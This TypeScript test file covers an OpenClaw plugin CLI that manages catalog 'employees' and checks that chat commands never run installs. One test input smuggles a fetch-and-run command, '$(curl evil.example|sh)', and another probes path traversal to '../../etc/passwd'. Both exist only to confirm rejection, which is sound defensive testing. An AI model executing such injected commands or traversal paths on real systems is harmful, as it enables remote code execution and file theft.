import assert from "node:assert/strict";
import { join } from "node:path";
import { test } from "node:test";
import { Refusal } from "../src/catalog/types.ts";
import { failureText, registerCli } from "../src/cli.ts";
import { hireCommand } from "../src/commands/hire.ts";
import { stateDirOf } from "../src/host.ts";
import { recorder } from "./kit/program.ts";
import { staff } from "./kit/staff.ts";
import { chat, world } from "./kit/world.ts";

async function fresh() {
  const { kit, dir } = await staff();
  return world(kit, dir);
}

test("chat: search, show and list answer with text", async () => {
  const w = await fresh();
  const found = await chat(w.cx(), "search archivist shelves");
  assert.match(found, /^harnsy\/sample-skills  1\.2\.0  Sample archivist \(Otis, operations\)/);
  assert.match(found, /openclaw harnsy-hr hire <id>/);
  const shown = await chat(w.cx(), "  show   harnsy/sample-skills ");
  assert.match(shown, /Files \(8\), written to /);
  assert.match(shown, /Notice \(kept in the workspace as NOTICE\.md\)/);
  assert.match(shown, /Hire it \(in a terminal\): openclaw harnsy-hr hire harnsy\/sample-skills/);
  assert.match(await chat(w.cx(), "list"), /Nobody is hired yet/);
  await hireCommand(w.cx(), "harnsy/sample-plain", { yes: true });
  assert.match(await chat(w.cx(), "list"), /^harnsy\/sample-plain  1\.0\.0  agent «sample-plain»/);
  assert.equal(w.printed.length, 2, "a chat answer is returned, not printed: only the hire above printed");
});

test("chat: hire, update and fire are never run; the answer is the terminal command", async () => {
  const w = await fresh(), before = w.snapshot();
  for (const verb of ["hire", "update", "fire"]) {
    const said = await chat(w.cx(), `${verb} harnsy/sample-skills --yes`);
    assert.match(said, /writes files and waits for your yes, so it is not done from a chat/);
    assert.ok(said.endsWith(`openclaw harnsy-hr ${verb} harnsy/sample-skills`), said);
  }
  const odd = await chat(w.cx(), "hire $(curl evil.example|sh) `id` \u001b[31m");
  assert.ok(odd.endsWith("openclaw harnsy-hr hire <publisher>/<name>"), "what is not an id is not echoed");
  assert.ok(!odd.includes("curl") && !odd.includes("\u001b"));
  assert.deepEqual(w.snapshot(), before);
  assert.deepEqual(w.calls, [], "no OpenClaw command is run from a chat");
});

test("chat: anything else gets the short help; a refusal is one plain line", async () => {
  const w = await fresh();
  for (const args of ["", "help", "delete everything"]) assert.match(await chat(w.cx(), args), /^\/harnsy-hr search <words>/);
  assert.equal(await chat(w.cx(), "show ../../etc/passwd"), "harnsy-hr: that is not an employee id: want <publisher>/<name>, for example harnsy/accountant");
  assert.equal(await chat(w.cx(), "show harnsy/nobody"), "harnsy-hr: harnsy/nobody is not in the catalog");
  assert.match(await chat(w.cx({ keys: [] }), "search x"), /^harnsy-hr: This build of the plugin has no catalog key built in, /);
});

test("the terminal command is harnsy-hr with search, show, hire, update, list, fire", async () => {
  const w = await fresh(), failures: string[] = [], { program, commands } = recorder();
  registerCli(program, () => w.cx(), (text) => failures.push(text));
  assert.deepEqual([...commands.keys()], ["harnsy-hr", "harnsy-hr search", "harnsy-hr show", "harnsy-hr hire", "harnsy-hr update", "harnsy-hr list", "harnsy-hr fire"]);
  assert.deepEqual(commands.get("harnsy-hr hire")!.options, ["--yes", "--test-catalog"]);
  assert.deepEqual(commands.get("harnsy-hr update")!.options, ["--yes", "--replace-edited", "--test-catalog"]);
  assert.deepEqual(commands.get("harnsy-hr fire")!.options, ["--yes"]);

  await commands.get("harnsy-hr search")!.action!(["archivist", "shelves"], { limit: "1" }, {});
  assert.match(w.printed.at(-1)!, /^harnsy\/sample-skills /);
  await commands.get("harnsy-hr hire")!.action!("harnsy/sample-skills", { yes: true }, {});
  assert.ok(w.agents.has("sample-skills"));
  await commands.get("harnsy-hr list")!.action!({}, {});
  assert.match(w.printed.at(-1)!, /^harnsy\/sample-skills  1\.2\.0/);
  await commands.get("harnsy-hr update")!.action!("harnsy/sample-skills", { yes: true }, {});
  assert.match(w.printed.at(-1)!, /every file is current/);
  await commands.get("harnsy-hr fire")!.action!("harnsy/sample-skills", { yes: true }, {});
  assert.ok(!w.agents.has("sample-skills"));
  assert.deepEqual(failures, []);

  await commands.get("harnsy-hr hire")!.action!("harnsy/nobody", { yes: true }, {});
  await commands.get("harnsy-hr show")!.action!("nonsense", {}, {});
  assert.deepEqual(failures, ["harnsy-hr: harnsy/nobody is not in the catalog",
    "harnsy-hr: that is not an employee id: want <publisher>/<name>, for example harnsy/accountant"]);
});

test("a failure is one line: the refusal's sentence, or a short note for a fault nobody planned, never a stack", () => {
  assert.equal(failureText(new Refusal("feed.json.sig does not verify")), "harnsy-hr: feed.json.sig does not verify");
  assert.equal(failureText(new TypeError("x is not a function")), "harnsy-hr: stopped by an unexpected fault (x is not a function); nothing more was done");
  assert.ok(!failureText(new Error("boom")).includes("\n"));
});

test("the state directory is the one OpenClaw names, else its documented place", () => {
  assert.equal(stateDirOf(() => "/srv/openclaw", {}), "/srv/openclaw");
  assert.equal(stateDirOf(() => { throw new Error("no runtime"); }, { OPENCLAW_STATE_DIR: "/data/oc" }), "/data/oc");
  assert.equal(stateDirOf(undefined, { OPENCLAW_STATE_DIR: "/data/oc" }), "/data/oc");
  assert.equal(stateDirOf(() => 42, {}), join((process.env["HOME"] ?? process.env["USERPROFILE"])!, ".openclaw"));
});
